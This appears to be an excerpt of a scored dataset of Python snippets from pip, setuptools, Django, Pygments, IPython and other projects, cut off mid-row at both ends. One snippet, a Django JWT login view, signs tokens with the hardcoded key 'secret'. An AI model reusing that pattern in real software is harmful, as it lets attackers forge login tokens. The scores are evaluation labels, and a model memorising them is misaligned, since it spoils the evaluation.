kind=""pip-egg-info"", globally_managed=True<<NEWL>>    ).path<<NEWL>><<NEWL>>    args = make_setuptools_egg_info_args(<<NEWL>>        setup_py_path,<<NEWL>>        egg_info_dir=egg_info_dir,<<NEWL>>        no_user_config=isolated,<<NEWL>>    )<<NEWL>><<NEWL>>    with build_env:<<NEWL>>        call_subprocess(<<NEWL>>            args,<<NEWL>>            cwd=source_dir,<<NEWL>>            command_desc='python setup.py egg_info',<<NEWL>>        )<<NEWL>><<NEWL>>    # Return the .egg-info directory.<<NEWL>>    return _find_egg_info(egg_info_dir)"
420	adjudicated	1	"from distutils.util import convert_path<<NEWL>>from distutils import log<<NEWL>>from distutils.errors import DistutilsOptionError<<NEWL>>import os<<NEWL>>import shutil<<NEWL>><<NEWL>>from setuptools import Command<<NEWL>><<NEWL>><<NEWL>>class rotate(Command):<<NEWL>>    """"""Delete older distributions""""""<<NEWL>><<NEWL>>    description = ""delete older distributions, keeping N newest files""<<NEWL>>    user_options = [<<NEWL>>        ('match=', 'm', ""patterns to match (required)""),<<NEWL>>        ('dist-dir=', 'd', ""directory where the distributions are""),<<NEWL>>        ('keep=', 'k', ""number of matching distributions to keep""),<<NEWL>>    ]<<NEWL>><<NEWL>>    boolean_options = []<<NEWL>><<NEWL>>    def initialize_options(self):<<NEWL>>        self.match = None<<NEWL>>        self.dist_dir = None<<NEWL>>        self.keep = None<<NEWL>><<NEWL>>    def finalize_options(self):<<NEWL>>        if self.match is None:<<NEWL>>            raise DistutilsOptionError(<<NEWL>>                ""Must specify one or more (comma-separated) match patterns ""<<NEWL>>                ""(e.g. '.zip' or '.egg')""<<NEWL>>            )<<NEWL>>        if self.keep is None:<<NEWL>>            raise DistutilsOptionError(""Must specify number of files to keep"")<<NEWL>>        try:<<NEWL>>            self.keep = int(self.keep)<<NEWL>>        except ValueError as e:<<NEWL>>            raise DistutilsOptionError(""--keep must be an integer"") from e<<NEWL>>        if isinstance(self.match, str):<<NEWL>>            self.match = [<<NEWL>>                convert_path(p.strip()) for p in self.match.split(',')<<NEWL>>            ]<<NEWL>>        self.set_undefined_options('bdist', ('dist_dir', 'dist_dir'))<<NEWL>><<NEWL>>    def run(self):<<NEWL>>        self.run_command(""egg_info"")<<NEWL>>        from glob import glob<<NEWL>><<NEWL>>        for pattern in self.match:<<NEWL>>            pattern = self.distribution.get_name() + '*' + pattern<<NEWL>>            files = glob(os.path.join(self.dist_dir, pattern))<<NEWL>>            files = [(os.path.getmtime(f), f) for f in files]<<NEWL>>            files.sort()<<NEWL>>            files.reverse()<<NEWL>><<NEWL>>            log.info(""%d file(s) matching %s"", len(files), pattern)<<NEWL>>            files = files[self.keep:]<<NEWL>>            for (t, f) in files:<<NEWL>>                log.info(""Deleting %s"", f)<<NEWL>>                if not self.dry_run:<<NEWL>>                    if os.path.isdir(f):<<NEWL>>                        shutil.rmtree(f)<<NEWL>>                    else:<<NEWL>>                        os.unlink(f)"
482	adjudicated	3	"from urllib.parse import unquote, urlparse<<NEWL>><<NEWL>>from asgiref.testing import ApplicationCommunicator<<NEWL>><<NEWL>><<NEWL>>class HttpCommunicator(ApplicationCommunicator):<<NEWL>>    """"""<<NEWL>>    ApplicationCommunicator subclass that has HTTP shortcut methods.<<NEWL>><<NEWL>>    It will construct the scope for you, so you need to pass the application<<NEWL>>    (uninstantiated) along with HTTP parameters.<<NEWL>><<NEWL>>    This does not support full chunking - for that, just use ApplicationCommunicator<<NEWL>>    directly.<<NEWL>>    """"""<<NEWL>><<NEWL>>    def __init__(self, application, method, path, body=b"""", headers=None):<<NEWL>>        parsed = urlparse(path)<<NEWL>>        self.scope = {<<NEWL>>            ""type"": ""http"",<<NEWL>>            ""http_version"": ""1.1"",<<NEWL>>            ""method"": method.upper(),<<NEWL>>            ""path"": unquote(parsed.path),<<NEWL>>            ""query_string"": parsed.query.encode(""utf-8""),<<NEWL>>            ""headers"": headers or [],<<NEWL>>        }<<NEWL>>        assert isinstance(body, bytes)<<NEWL>>        self.body = body<<NEWL>>        self.sent_request = False<<NEWL>>        super().__init__(application, self.scope)<<NEWL>><<NEWL>>    async def get_response(self, timeout=1):<<NEWL>>        """"""<<NEWL>>        Get the application's response. Returns a dict with keys of<<NEWL>>        ""body"", ""headers"" and ""status"".<<NEWL>>        """"""<<NEWL>>        # If we've not sent the request yet, do so<<NEWL>>        if not self.sent_request:<<NEWL>>            self.sent_request = True<<NEWL>>            await self.send_input({""type"": ""http.request"", ""body"": self.body})<<NEWL>>        # Get the response start<<NEWL>>        response_start = await self.receive_output(timeout)<<NEWL>>        assert response_start[""type""] == ""http.response.start""<<NEWL>>        # Get all body parts<<NEWL>>        response_start[""body""] = b""""<<NEWL>>        while True:<<NEWL>>            chunk = await self.receive_output(timeout)<<NEWL>>            assert chunk[""type""] == ""http.response.body""<<NEWL>>            assert isinstance(chunk[""body""], bytes)<<NEWL>>            response_start[""body""] += chunk[""body""]<<NEWL>>            if not chunk.get(""more_body"", False):<<NEWL>>                break<<NEWL>>        # Return structured info<<NEWL>>        del response_start[""type""]<<NEWL>>        response_start.setdefault(""headers"", [])<<NEWL>>        return response_start"
414	adjudicated	3	"# -*- coding: utf-8 -*-<<NEWL>>#<<NEWL>># Copyright (C) 2019 Radim Rehurek <me@radimrehurek.com><<NEWL>>#<<NEWL>># This code is distributed under the terms and conditions<<NEWL>># from the MIT License (MIT).<<NEWL>>#<<NEWL>><<NEWL>>""""""<<NEWL>>Utilities for streaming to/from several file-like data storages: S3 / HDFS / local<<NEWL>>filesystem / compressed files, and many more, using a simple, Pythonic API.<<NEWL>><<NEWL>>The streaming makes heavy use of generators and pipes, to avoid loading<<NEWL>>full file contents into memory, allowing work with arbitrarily large files.<<NEWL>><<NEWL>>The main functions are:<<NEWL>><<NEWL>>* `open()`, which opens the given file for reading/writing<<NEWL>>* `parse_uri()`<<NEWL>>* `s3_iter_bucket()`, which goes over all keys in an S3 bucket in parallel<<NEWL>>* `register_compressor()`, which registers callbacks for transparent compressor handling<<NEWL>><<NEWL>>""""""<<NEWL>><<NEWL>>import logging<<NEWL>><<NEWL>>#<<NEWL>># Prevent regression of #474 and #475<<NEWL>>#<<NEWL>>logger = logging.getLogger(__name__)<<NEWL>>logger.addHandler(logging.NullHandler())<<NEWL>><<NEWL>>from smart_open import version  # noqa: E402<<NEWL>>from .smart_open_lib import open, parse_uri, smart_open, register_compressor  # noqa: E402<<NEWL>><<NEWL>>_WARNING = """"""smart_open.s3_iter_bucket is deprecated and will stop functioning<<NEWL>>in a future version. Please import iter_bucket from the smart_open.s3 module instead:<<NEWL>><<NEWL>>    from smart_open.s3 import iter_bucket as s3_iter_bucket<<NEWL>><<NEWL>>""""""<<NEWL>>_WARNED = False<<NEWL>><<NEWL>><<NEWL>>def s3_iter_bucket(<<NEWL>>        bucket_name,<<NEWL>>        prefix='',<<NEWL>>        accept_key=None,<<NEWL>>        key_limit=None,<<NEWL>>        workers=16,<<NEWL>>        retries=3,<<NEWL>>        **session_kwargs<<NEWL>>):<<NEWL>>    """"""Deprecated.  Use smart_open.s3.iter_bucket instead.""""""<<NEWL>>    global _WARNED<<NEWL>>    from .s3 import iter_bucket<<NEWL>>    if not _WARNED:<<NEWL>>        logger.warning(_WARNING)<<NEWL>>        _WARNED = True<<NEWL>>    return iter_bucket(<<NEWL>>        bucket_name=bucket_name,<<NEWL>>        prefix=prefix,<<NEWL>>        accept_key=accept_key,<<NEWL>>        key_limit=key_limit,<<NEWL>>        workers=workers,<<NEWL>>        retries=retries,<<NEWL>>        session_kwargs=session_kwargs<<NEWL>>    )<<NEWL>><<NEWL>><<NEWL>>__all__ = [<<NEWL>>    'open',<<NEWL>>    'parse_uri',<<NEWL>>    'register_compressor',<<NEWL>>    's3_iter_bucket',<<NEWL>>    'smart_open',<<NEWL>>]<<NEWL>><<NEWL>>__version__ = version.__version__"
505	adjudicated	3	"""""""<<NEWL>>    pygments.styles.vim<<NEWL>>    ~~~~~~~~~~~~~~~~~~~<<NEWL>><<NEWL>>    A highlighting style for Pygments, inspired by vim.<<NEWL>><<NEWL>>    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.<<NEWL>>    :license: BSD, see LICENSE for details.<<NEWL>>""""""<<NEWL>><<NEWL>>from pygments.style import Style<<NEWL>>from pygments.token import Keyword, Name, Comment, String, Error, \<<NEWL>>     Number, Operator, Generic, Whitespace, Token<<NEWL>><<NEWL>><<NEWL>>class VimStyle(Style):<<NEWL>>    """"""<<NEWL>>    Styles somewhat like vim 7.0<<NEWL>>    """"""<<NEWL>><<NEWL>>    background_color = ""#000000""<<NEWL>>    highlight_color = ""#222222""<<NEWL>><<NEWL>>    styles = {<<NEWL>>        Token:                     ""#cccccc"",<<NEWL>>        Whitespace:                """",<<NEWL>>        Comment:                   ""#000080"",<<NEWL>>        Comment.Preproc:           """",<<NEWL>>        Comment.Special:           ""bold #cd0000"",<<NEWL>><<NEWL>>        Keyword:                   ""#cdcd00"",<<NEWL>>        Keyword.Declaration:       ""#00cd00"",<<NEWL>>        Keyword.Namespace:         ""#cd00cd"",<<NEWL>>        Keyword.Pseudo:            """",<<NEWL>>        Keyword.Type:              ""#00cd00"",<<NEWL>><<NEWL>>        Operator:                  ""#3399cc"",<<NEWL>>        Operator.Word:             ""#cdcd00"",<<NEWL>><<NEWL>>        Name:                      """",<<NEWL>>        Name.Class:                ""#00cdcd"",<<NEWL>>        Name.Builtin:              ""#cd00cd"",<<NEWL>>        Name.Exception:            ""bold #666699"",<<NEWL>>        Name.Variable:             ""#00cdcd"",<<NEWL>><<NEWL>>        String:                    ""#cd0000"",<<NEWL>>        Number:                    ""#cd00cd"",<<NEWL>><<NEWL>>        Generic.Heading:           ""bold #000080"",<<NEWL>>        Generic.Subheading:        ""bold #800080"",<<NEWL>>        Generic.Deleted:           ""#cd0000"",<<NEWL>>        Generic.Inserted:          ""#00cd00"",<<NEWL>>        Generic.Error:             ""#FF0000"",<<NEWL>>        Generic.Emph:              ""italic"",<<NEWL>>        Generic.Strong:            ""bold"",<<NEWL>>        Generic.Prompt:            ""bold #000080"",<<NEWL>>        Generic.Output:            ""#888"",<<NEWL>>        Generic.Traceback:         ""#04D"",<<NEWL>><<NEWL>>        Error:                     ""border:#FF0000""<<NEWL>>    }"
445	adjudicated	0	from rest_framework.views import APIView<<NEWL>>from rest_framework.response import Response<<NEWL>>from rest_framework.exceptions import AuthenticationFailed<<NEWL>>from rest_framework.parsers import JSONParser<<NEWL>>from .serializers import UserSerializer<<NEWL>>from .models import User<<NEWL>>import jwt<<NEWL>>import datetime<<NEWL>>from jwt import decode<<NEWL>>from bson.objectid import ObjectId<<NEWL>><<NEWL>>import sys<<NEWL>><<NEWL>>from helpers.permissions import isUser<<NEWL>><<NEWL>>class RegisterView(APIView):<<NEWL>>    def post(self, request):<<NEWL>>        serializer = UserSerializer(data=request.data)<<NEWL>>        serializer.is_valid(raise_exception=True)<<NEWL>>        serializer.save()<<NEWL>>        return Response(serializer.data)<<NEWL>><<NEWL>><<NEWL>>class LoginView(APIView):<<NEWL>>    def post(self, request):<<NEWL>>        email = request.data['email']<<NEWL>>        password = request.data['password']<<NEWL>><<NEWL>>        user = User.objects.filter(email__exact=email).first()<<NEWL>><<NEWL>>        if user is None:<<NEWL>>            raise AuthenticationFailed('User not found!')<<NEWL>><<NEWL>>        if not user.check_password(password):<<NEWL>>            raise AuthenticationFailed('Incorrect password!')<<NEWL>><<NEWL>>        payload = {<<NEWL>>            'id': str(user._id),<<NEWL>>            'admin': user.is_superAdmin,<<NEWL>>            'exp': datetime.datetime.utcnow() + datetime.timedelta(minutes=60),<<NEWL>>            'iat': datetime.datetime.utcnow()<<NEWL>>        }<<NEWL>>        <<NEWL>><<NEWL>>        token = jwt.encode(payload, 'secret',<<NEWL>>                           algorithm='HS256').decode('utf-8')<<NEWL>><<NEWL>>        response = Response()<<NEWL>><<NEWL>>        response.set_cookie(key='jwt', value=token, httponly=True)<<NEWL>>        response.data = {<<NEWL>>            'jwt': token<<NEWL>>        }<<NEWL>><<NEWL>>        return response<<NEWL>><<NEWL>><<NEWL>>class UserView(APIView):<<NEWL>>    <<NEWL>>    permission_classes = [isUser]<<NEWL>><<NEWL>>    def get(self, request):<<NEWL>>        user = User.objects.filter(_id=ObjectId(request.account['id'])).first()<<NEWL>>        serializer = UserSerializer(user)<<NEWL>>        <<NEWL>>        return Response(serializer.data)<<NEWL>><<NEWL>><<NEWL>><<NEWL>>class LogoutView(APIView):<<NEWL>>    def post(self, request):<<NEWL>>        response = Response()<<NEWL>>        response.delete_cookie('jwt')<<NEWL>>        response.data = {<<NEWL>>            'message': 'success'<<NEWL>>        }<<NEWL>>        return response
178	adjudicated	4	"""""""For neatly implementing static typing in packaging.<<NEWL>><<NEWL>>`mypy` - the static type analysis tool we use - uses the `typing` module, which<<NEWL>>provides core functionality fundamental to mypy's functioning.<<NEWL>><<NEWL>>Generally, `typing` would be imported at runtime and used in that fashion -<<NEWL>>it acts as a no-op at runtime and does not have any run-time overhead by<<NEWL>>design.<<NEWL>><<NEWL>>As it turns out, `typing` is not vendorable - it uses separate sources for<<NEWL>>Python 2/Python 3. Thus, this codebase can not expect it to be present.<<NEWL>>To work around this, mypy allows the typing import to be behind a False-y<<NEWL>>optional to prevent it from running at runtime and type-comments can be used<<NEWL>>to remove the need for the types to be accessible directly during runtime.<<NEWL>><<NEWL>>This module provides the False-y guard in a nicely named fashion so that a<<NEWL>>curious maintainer can reach here to read this.<<NEWL>><<NEWL>>In packaging, all static-typing related imports should be guarded as follows:<<NEWL>><<NEWL>>    from packaging._typing import TYPE_CHECKING<<NEWL>><<NEWL>>    if TYPE_CHECKING:<<NEWL>>        from typing import ...<<NEWL>><<NEWL>>Ref: https://github.com/python/mypy/issues/3216<<NEWL>>""""""<<NEWL>><<NEWL>>__all__ = [""TYPE_CHECKING"", ""cast""]<<NEWL>><<NEWL>># The TYPE_CHECKING constant defined by the typing module is False at runtime<<NEWL>># but True while type checking.<<NEWL>>if False:  # pragma: no cover<<NEWL>>    from typing import TYPE_CHECKING<<NEWL>>else:<<NEWL>>    TYPE_CHECKING = False<<NEWL>><<NEWL>># typing's cast syntax requires calling typing.cast at runtime, but we don't<<NEWL>># want to import typing at runtime. Here, we inform the type checkers that<<NEWL>># we're importing `typing.cast` as `cast` and re-implement typing.cast's<<NEWL>># runtime behavior in a block that is ignored by type checkers.<<NEWL>>if TYPE_CHECKING:  # pragma: no cover<<NEWL>>    # not executed at runtime<<NEWL>>    from typing import cast<<NEWL>>else:<<NEWL>>    # executed at runtime<<NEWL>>    def cast(type_, value):  # noqa<<NEWL>>        return value"
38	adjudicated	2	"from django.apps import apps<<NEWL>>from django.conf import settings<<NEWL>>from django.contrib.redirects.models import Redirect<<NEWL>>from django.contrib.sites.shortcuts import get_current_site<<NEWL>>from django.core.exceptions import ImproperlyConfigured<<NEWL>>from django.http import HttpResponseGone, HttpResponsePermanentRedirect<<NEWL>>from django.utils.deprecation import MiddlewareMixin<<NEWL>><<NEWL>><<NEWL>>class RedirectFallbackMiddleware(MiddlewareMixin):<<NEWL>>    # Defined as class-level attributes to be subclassing-friendly.<<NEWL>>    response_gone_class = HttpResponseGone<<NEWL>>    response_redirect_class = HttpResponsePermanentRedirect<<NEWL>><<NEWL>>    def __init__(self, get_response):<<NEWL>>        if not apps.is_installed(""django.contrib.sites""):<<NEWL>>            raise ImproperlyConfigured(<<NEWL>>                ""You cannot use RedirectFallbackMiddleware when ""<<NEWL>>                ""django.contrib.sites is not installed.""<<NEWL>>            )<<NEWL>>        super().__init__(get_response)<<NEWL>><<NEWL>>    def process_response(self, request, response):<<NEWL>>        # No need to check for a redirect for non-404 responses.<<NEWL>>        if response.status_code != 404:<<NEWL>>            return response<<NEWL>><<NEWL>>        full_path = request.get_full_path()<<NEWL>>        current_site = get_current_site(request)<<NEWL>><<NEWL>>        r = None<<NEWL>>        try:<<NEWL>>            r = Redirect.objects.get(site=current_site, old_path=full_path)<<NEWL>>        except Redirect.DoesNotExist:<<NEWL>>            pass<<NEWL>>        if r is None and settings.APPEND_SLASH and not request.path.endswith(""/""):<<NEWL>>            try:<<NEWL>>                r = Redirect.objects.get(<<NEWL>>                    site=current_site,<<NEWL>>                    old_path=request.get_full_path(force_append_slash=True),<<NEWL>>                )<<NEWL>>            except Redirect.DoesNotExist:<<NEWL>>                pass<<NEWL>>        if r is not None:<<NEWL>>            if r.new_path == """":<<NEWL>>                return self.response_gone_class()<<NEWL>>            return self.response_redirect_class(r.new_path)<<NEWL>><<NEWL>>        # No redirect was found. Return the response.<<NEWL>>        return response"
129	adjudicated	4	"from rx.core import Observable, AnonymousObservable<<NEWL>>from rx.disposables import CompositeDisposable<<NEWL>>from rx.concurrency import timeout_scheduler<<NEWL>>from rx.internal import extensionmethod<<NEWL>><<NEWL>><<NEWL>>def sample_observable(source, sampler):<<NEWL>><<NEWL>>    def subscribe(observer):<<NEWL>>        at_end = [None]<<NEWL>>        has_value = [None]<<NEWL>>        value = [None]<<NEWL>><<NEWL>>        def sample_subscribe(x=None):<<NEWL>>            if has_value[0]:<<NEWL>>                has_value[0] = False<<NEWL>>                observer.on_next(value[0])<<NEWL>><<NEWL>>            if at_end[0]:<<NEWL>>                observer.on_completed()<<NEWL>><<NEWL>>        def on_next(new_value):<<NEWL>>            has_value[0] = True<<NEWL>>            value[0] = new_value<<NEWL>><<NEWL>>        def on_completed():<<NEWL>>            at_end[0] = True<<NEWL>><<NEWL>>        return CompositeDisposable(<<NEWL>>            source.subscribe(on_next, observer.on_error, on_completed),<<NEWL>>            sampler.subscribe(sample_subscribe, observer.on_error, sample_subscribe)<<NEWL>>        )<<NEWL>>    return AnonymousObservable(subscribe)<<NEWL>><<NEWL>><<NEWL>>@extensionmethod(Observable, alias=""throttle_last"")<<NEWL>>def sample(self, interval=None, sampler=None, scheduler=None):<<NEWL>>    """"""Samples the observable sequence at each interval.<<NEWL>><<NEWL>>    1 - res = source.sample(sample_observable) # Sampler tick sequence<<NEWL>>    2 - res = source.sample(5000) # 5 seconds<<NEWL>>    2 - res = source.sample(5000, rx.scheduler.timeout) # 5 seconds<<NEWL>><<NEWL>>    Keyword arguments:<<NEWL>>    source -- Source sequence to sample.<<NEWL>>    interval -- Interval at which to sample (specified as an integer<<NEWL>>        denoting milliseconds).<<NEWL>>    scheduler -- [Optional] Scheduler to run the sampling timer on. If not<<NEWL>>        specified, the timeout scheduler is used.<<NEWL>><<NEWL>>    Returns sampled observable sequence.<<NEWL>>    """"""<<NEWL>><<NEWL>>    scheduler = scheduler or timeout_scheduler<<NEWL>>    if interval is not None:<<NEWL>>        return sample_observable(self, Observable.interval(interval, scheduler=scheduler))<<NEWL>><<NEWL>>    return sample_observable(self, sampler)"
69	adjudicated	3	"from importlib import import_module<<NEWL>><<NEWL>>from django.utils.version import get_docs_version<<NEWL>><<NEWL>><<NEWL>>def deconstructible(*args, path=None):<<NEWL>>    """"""<<NEWL>>    Class decorator that allows the decorated class to be serialized<<NEWL>>    by the migrations subsystem.<<NEWL>><<NEWL>>    The `path` kwarg specifies the import path.<<NEWL>>    """"""<<NEWL>>    def decorator(klass):<<NEWL>>        def __new__(cls, *args, **kwargs):<<NEWL>>            # We capture the arguments to make returning them trivial<<NEWL>>            obj = super(klass, cls).__new__(cls)<<NEWL>>            obj._constructor_args = (args, kwargs)<<NEWL>>            return obj<<NEWL>><<NEWL>>        def deconstruct(obj):<<NEWL>>            """"""<<NEWL>>            Return a 3-tuple of class import path, positional arguments,<<NEWL>>            and keyword arguments.<<NEWL>>            """"""<<NEWL>>            # Fallback version<<NEWL>>            if path:<<NEWL>>                module_name, _, name = path.rpartition('.')<<NEWL>>            else:<<NEWL>>                module_name = obj.__module__<<NEWL>>                name = obj.__class__.__name__<<NEWL>>            # Make sure it's actually there and not an inner class<<NEWL>>            module = import_module(module_name)<<NEWL>>            if not hasattr(module, name):<<NEWL>>                raise ValueError(<<NEWL>>                    ""Could not find object %s in %s.\n""<<NEWL>>                    ""Please note that you cannot serialize things like inner ""<<NEWL>>                    ""classes. Please move the object into the main module ""<<NEWL>>                    ""body to use migrations.\n""<<NEWL>>                    ""For more information, see ""<<NEWL>>                    ""https://docs.djangoproject.com/en/%s/topics/migrations/#serializing-values""<<NEWL>>                    % (name, module_name, get_docs_version()))<<NEWL>>            return (<<NEWL>>                path or '%s.%s' % (obj.__class__.__module__, name),<<NEWL>>                obj._constructor_args[0],<<NEWL>>                obj._constructor_args[1],<<NEWL>>            )<<NEWL>><<NEWL>>        klass.__new__ = staticmethod(__new__)<<NEWL>>        klass.deconstruct = deconstruct<<NEWL>><<NEWL>>        return klass<<NEWL>><<NEWL>>    if not args:<<NEWL>>        return decorator<<NEWL>>    return decorator(*args)"
79	adjudicated	0	"from django import forms<<NEWL>><<NEWL>>from ckeditor.fields import RichTextFormField<<NEWL>>from ckeditor.widgets import CKEditorWidget<<NEWL>>from ckeditor_uploader.fields import RichTextUploadingFormField<<NEWL>>from ckeditor_uploader.widgets import CKEditorUploadingWidget<<NEWL>><<NEWL>>from .models import ExampleModel, ExampleNonUploadModel<<NEWL>>from .widgets import CkEditorMultiWidget<<NEWL>><<NEWL>><<NEWL>>class CkEditorForm(forms.Form):<<NEWL>>    ckeditor_standard_example = RichTextFormField()<<NEWL>>    ckeditor_upload_example = RichTextUploadingFormField(<<NEWL>>        config_name=""my-custom-toolbar""<<NEWL>>    )<<NEWL>><<NEWL>><<NEWL>>class CkEditorMultiWidgetForm(forms.Form):<<NEWL>>    SUBWIDGET_SUFFIXES = [""0"", ""1""]<<NEWL>><<NEWL>>    ckeditor_standard_multi_widget_example = forms.CharField(<<NEWL>>        widget=CkEditorMultiWidget(<<NEWL>>            widgets={suffix: CKEditorWidget for suffix in SUBWIDGET_SUFFIXES},<<NEWL>>        ),<<NEWL>>    )<<NEWL>>    ckeditor_upload_multi_widget_example = forms.CharField(<<NEWL>>        widget=CkEditorMultiWidget(<<NEWL>>            widgets={<<NEWL>>                suffix: CKEditorUploadingWidget(config_name=""my-custom-toolbar"")<<NEWL>>                for suffix in SUBWIDGET_SUFFIXES<<NEWL>>            },<<NEWL>>        ),<<NEWL>>    )<<NEWL>><<NEWL>><<NEWL>>class ExampleModelForm(forms.ModelForm):<<NEWL>>    class Meta:<<NEWL>>        model = ExampleModel<<NEWL>>        fields = ""__all__""<<NEWL>><<NEWL>><<NEWL>>class ExampleNonUploadModelForm(forms.ModelForm):<<NEWL>>    class Meta:<<NEWL>>        model = ExampleNonUploadModel<<NEWL>>        fields = ""__all__""<<NEWL>><<NEWL>><<NEWL>>class ExampleModelOverriddenWidgetForm(forms.ModelForm):<<NEWL>>    class Meta:<<NEWL>>        model = ExampleModel<<NEWL>>        fields = ""__all__""<<NEWL>><<NEWL>>    def __init__(self, *args, **kwargs):<<NEWL>>        super().__init__(*args, **kwargs)<<NEWL>><<NEWL>>        self.fields[""content""].widget = CKEditorUploadingWidget(<<NEWL>>            config_name=""my-custom-toolbar"",<<NEWL>>            extra_plugins=[""someplugin"", ""anotherplugin""],<<NEWL>>            external_plugin_resources=[<<NEWL>>                (<<NEWL>>                    ""someplugin"",<<NEWL>>                    ""/static/path/to/someplugin/"",<<NEWL>>                    ""plugin.js"",<<NEWL>>                )<<NEWL>>            ],<<NEWL>>        )"
139	adjudicated	3	"# encoding: utf-8<<NEWL>>""""""<<NEWL>>Autocall capabilities for IPython.core.<<NEWL>><<NEWL>>Authors:<<NEWL>><<NEWL>>* Brian Granger<<NEWL>>* Fernando Perez<<NEWL>>* Thomas Kluyver<<NEWL>><<NEWL>>Notes<<NEWL>>-----<<NEWL>>""""""<<NEWL>><<NEWL>>#-----------------------------------------------------------------------------<<NEWL>>#  Copyright (C) 2008-2011  The IPython Development Team<<NEWL>>#<<NEWL>>#  Distributed under the terms of the BSD License.  The full license is in<<NEWL>>#  the file COPYING, distributed as part of this software.<<NEWL>>#-----------------------------------------------------------------------------<<NEWL>><<NEWL>>#-----------------------------------------------------------------------------<<NEWL>># Imports<<NEWL>>#-----------------------------------------------------------------------------<<NEWL>><<NEWL>><<NEWL>>#-----------------------------------------------------------------------------<<NEWL>># Code<<NEWL>>#-----------------------------------------------------------------------------<<NEWL>><<NEWL>>class IPyAutocall(object):<<NEWL>>    """""" Instances of this class are always autocalled<<NEWL>>    <<NEWL>>    This happens regardless of 'autocall' variable state. Use this to<<NEWL>>    develop macro-like mechanisms.<<NEWL>>    """"""<<NEWL>>    _ip = None<<NEWL>>    rewrite = True<<NEWL>>    def __init__(self, ip=None):<<NEWL>>        self._ip = ip<<NEWL>>    <<NEWL>>    def set_ip(self, ip):<<NEWL>>        """"""Will be used to set _ip point to current ipython instance b/f call<<NEWL>><<NEWL>>        Override this method if you don't want this to happen.<<NEWL>><<NEWL>>        """"""<<NEWL>>        self._ip = ip<<NEWL>><<NEWL>><<NEWL>>class ExitAutocall(IPyAutocall):<<NEWL>>    """"""An autocallable object which will be added to the user namespace so that<<NEWL>>    exit, exit(), quit or quit() are all valid ways to close the shell.""""""<<NEWL>>    rewrite = False<<NEWL>>    <<NEWL>>    def __call__(self):<<NEWL>>        self._ip.ask_exit()<<NEWL>>        <<NEWL>>class ZMQExitAutocall(ExitAutocall):<<NEWL>>    """"""Exit IPython. Autocallable, so it needn't be explicitly called.<<NEWL>>    <<NEWL>>    Parameters<<NEWL>>    ----------<<NEWL>>    keep_kernel : bool<<NEWL>>      If True, leave the kernel alive. Otherwise, tell the kernel to exit too<<NEWL>>      (default).<<NEWL>>    """"""<<NEWL>>    def __call__(self, keep_kernel=False):<<NEWL>>        self._ip.keepkernel_on_exit = keep_kernel<<NEWL>>        self._ip.ask_exit()"
28	adjudicated	0	"import traceback<<NEWL>><<NEWL>>class Symbol(object):<<NEWL>>    def __init__(self, anchor, type, cppname):<<NEWL>>        self.anchor = anchor<<NEWL>>        self.type = type<<NEWL>>        self.cppname = cppname<<NEWL>>        #if anchor == 'ga586ebfb0a7fb604b35a23d85391329be':<<NEWL>>        #    print(repr(self))<<NEWL>>        #    traceback.print_stack()<<NEWL>><<NEWL>>    def __repr__(self):<<NEWL>>        return '%s:%s@%s' % (self.type, self.cppname, self.anchor)<<NEWL>><<NEWL>>def add_to_file(files_dict, file, anchor):<<NEWL>>    anchors = files_dict.setdefault(file, [])<<NEWL>>    anchors.append(anchor)<<NEWL>><<NEWL>><<NEWL>>def scan_namespace_constants(ns, ns_name, files_dict):<<NEWL>>    constants = ns.findall(""./member[@kind='enumvalue']"")<<NEWL>>    for c in constants:<<NEWL>>        c_name = c.find(""./name"").text<<NEWL>>        name = ns_name + '::' + c_name<<NEWL>>        file = c.find(""./anchorfile"").text<<NEWL>>        anchor = c.find(""./anchor"").text<<NEWL>>        #print('    CONST: {} => {}#{}'.format(name, file, anchor))<<NEWL>>        add_to_file(files_dict, file, Symbol(anchor, ""const"", name))<<NEWL>><<NEWL>>def scan_namespace_functions(ns, ns_name, files_dict):<<NEWL>>    functions = ns.findall(""./member[@kind='function']"")<<NEWL>>    for f in functions:<<NEWL>>        f_name = f.find(""./name"").text<<NEWL>>        name = ns_name + '::' + f_name<<NEWL>>        file = f.find(""./anchorfile"").text<<NEWL>>        anchor = f.find(""./anchor"").text<<NEWL>>        #print('    FN: {} => {}#{}'.format(name, file, anchor))<<NEWL>>        add_to_file(files_dict, file, Symbol(anchor, ""fn"", name))<<NEWL>><<NEWL>>def scan_class_methods(c, c_name, files_dict):<<NEWL>>    methods = c.findall(""./member[@kind='function']"")<<NEWL>>    for m in methods:<<NEWL>>        m_name = m.find(""./name"").text<<NEWL>>        name = c_name + '::' + m_name<<NEWL>>        file = m.find(""./anchorfile"").text<<NEWL>>        anchor = m.find(""./anchor"").text<<NEWL>>        #print('    Method: {} => {}#{}'.format(name, file, anchor))<<NEWL>>        add_to_file(files_dict, file, Symbol(anchor, ""method"", name))"
168	adjudicated	4	"# Copyright 2017-present Adtran, Inc.<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>># http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>>from voltha.protos.events_pb2 import AlarmEventType, AlarmEventSeverity, AlarmEventCategory<<NEWL>>from voltha.extensions.alarms.adapter_alarms import AlarmBase<<NEWL>><<NEWL>><<NEWL>>class OnuEquipmentAlarm(AlarmBase):<<NEWL>>    """"""<<NEWL>>    The ONU Equipment Alarm is reported by both the CircuitPack (ME #6) and<<NEWL>>    the ONT-G (ME # 256) to indicate failure on an internal interface or<<NEWL>>    failed self-test.<<NEWL>><<NEWL>>    For CircuitPack equipment alarms, the intf_id reported is that of the<<NEWL>>    UNI's logical port number<<NEWL>><<NEWL>>    For ONT-G equipment alarms, the intf_id reported is that of the PON/ANI<<NEWL>>    physical port number<<NEWL>><<NEWL>>    Note: Some ONUs may use this alarm to report a self-test failure or may<<NEWL>>          may report it with a different alarm number specifically for a<<NEWL>>          self-test failure.<<NEWL>>    """"""<<NEWL>>    def __init__(self, alarm_mgr, onu_id, intf_id):<<NEWL>>        super(OnuEquipmentAlarm, self).__init__(alarm_mgr, object_type='onu equipment',<<NEWL>>                                                alarm='ONU_EQUIPMENT',<<NEWL>>                                                alarm_category=AlarmEventCategory.ONU,<<NEWL>>                                                